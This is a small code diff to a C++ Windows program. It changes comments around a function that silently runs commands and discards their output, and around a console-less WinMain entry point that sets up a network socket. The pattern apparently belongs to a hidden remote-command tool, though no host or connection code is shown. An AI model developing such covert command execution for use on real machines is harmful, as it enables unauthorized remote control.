@@ -15,11 +15,12 @@ void executeCommand(const string& command) {
         return; // If execution fails, return silently
     }
     while (fgets(buffer, sizeof(buffer), fp) != NULL) {
-        // You can handle the output here, but nothing is shown on the console
+        // You can process the command output here if needed
     }
     _pclose(fp);
 }
 
+// The entry point for the application. This is used in place of `main()`
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
     WSADATA wsa;
     SOCKET s;
